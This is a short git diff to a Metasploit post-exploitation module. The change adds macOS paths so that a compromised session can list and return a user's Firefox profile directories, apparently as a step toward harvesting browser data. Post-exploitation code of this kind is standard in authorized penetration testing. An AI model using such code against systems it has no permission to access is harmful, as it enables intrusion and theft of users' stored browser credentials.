@@ -97,7 +97,11 @@ class Metasploit3 < Msf::Post
 		else
 			print_status("We do not have root privileges")
 			print_status("Checking #{id} account for Firefox")
-			firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
+			if @platform == :osx
+				firefox = session.shell_command("ls #{home}#{id}/Library/Application\\ Support/Firefox/Profiles/").gsub(/\s/, "\n")
+			else
+				firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
+			end
 
 			firefox.each_line do |profile|
 				profile.chomp!
@@ -105,7 +109,11 @@ class Metasploit3 < Msf::Post
 
 				if profile =~ /\.default/
 						print_status("Found Firefox Profile for: #{id}")
-						return [home + id + "/.mozilla/" + "firefox/" + profile + "/"]
+						if @platform == :osx
+							return [home + id + "/Library/Application\\ Support/Firefox/Profiles/" + profile + "/"]
+						else
+							return [home + id + "/.mozilla/" + "firefox/" + profile + "/"]
+						end
 				end
 			end
 			return
